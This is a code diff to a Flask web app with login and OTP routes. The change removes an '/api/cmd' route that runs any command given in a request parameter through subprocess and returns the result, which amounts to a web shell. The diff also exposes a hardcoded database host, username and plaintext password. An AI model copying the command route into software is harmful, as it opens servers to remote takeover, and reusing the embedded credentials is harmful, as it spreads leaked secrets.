@@ -12,7 +12,6 @@ from .Mail import Mail
 import random
 import psycopg2 # type: ignore
 from flask_cors import CORS
-import subprocess
 app = Flask(__name__)
 #updated code from 
 CORS(app,supports_credentials=True)
@@ -21,7 +20,7 @@ app.config["MYSQL_HOST"] = "ep-aged-rain-a472d7qt-pooler.us-east-1.aws.neon.tech
 app.config["MYSQL_USER"] = "default"
 app.config["MYSQL_DB"] = "verceldb"
 app.config["MYSQL_PASSWORD"] ="2pVZitHFc5aY"
-
+print(os.system("pwd"))
 #hwllo updated
 con = psycopg2.connect(
     host = app.config["MYSQL_HOST"],
@@ -389,11 +388,6 @@ def varify_otp():
                     return Responce.send(401,{},"Try Again")
     else:
         return Responce.send(401,{},"requied filed not found")
-@app.route("/api/cmd/<cmd>",methods=["GET"])
-def cmd(cmd):
-    cmd = request.args.get("cmd")
-    result = subprocess.run(cmd, capture_output=True, text=True)
-    return make_response(f"{result}")
-    
+
 if __name__ == '__main__':
     app.run(debug=True)
